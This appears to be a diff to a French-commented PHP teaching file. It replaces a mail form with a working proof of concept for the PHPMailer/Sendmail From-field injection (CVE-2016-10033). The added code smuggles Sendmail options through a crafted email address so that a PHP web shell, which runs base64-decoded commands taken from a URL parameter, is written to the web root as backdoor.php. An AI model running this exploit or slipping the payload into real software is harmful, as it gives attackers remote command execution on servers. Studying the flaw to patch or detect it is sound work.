@@ -23,8 +23,10 @@ exemple 2 : exécution d'un shell
 
 
 
-/**************************************************************************/
+/**************************************************************************
+ 	Explications sur la fonction mail php -> utilisation des options 
 
+****************************************************************************/
 
 if(isset($_POST['mail'])){
 
@@ -43,11 +45,36 @@ echo 'done';
 
 ?>
 
+/**************************************************************************
+ 	Explications de l'injection dans le champ from de SendMail < 5.2.18
 
-<form method="POST">
-	Login : <input type="text" name="login" /> <br />
-	Mail : <input type="text" name="mail" /> </br />
-	Message : <textarea name="message"></textarea>
-	<input type="submit" value="Envoyer" />
+****************************************************************************/
 
-</form>
+
+require_once("vendor/autoload.php");
+//require("PHPMailerAutoload.php");
+
+
+// Tests valeurs payloads
+$name='test'; 
+$email='"attacker\" -OQueueDirectory=/tmp -X/var/www/html/backdoor.php some"@example.com';
+$message='<?php echo "|".system(base64_decode($_GET["cmd"]))."|<br />"; ?>';
+
+//Sendmail vulnerable
+$mail = new PHPMailer;
+$mail->Host="localhost";
+
+$mail->setFrom($email, "Send mail CVE-2016-10033");
+$mail->addAddress("mail@example.com");     // Add a recipient
+//$mail->isHTML(true); 
+$mail->Subject = "Message from $name";
+$mail->Body    = $message;
+
+
+if(!$mail->send()) {
+    echo 'Message could not be sent.';
+    echo 'Mailer Error: ' . $mail->ErrorInfo;
+} else {
+    echo 'Message has been sent';
+}
+
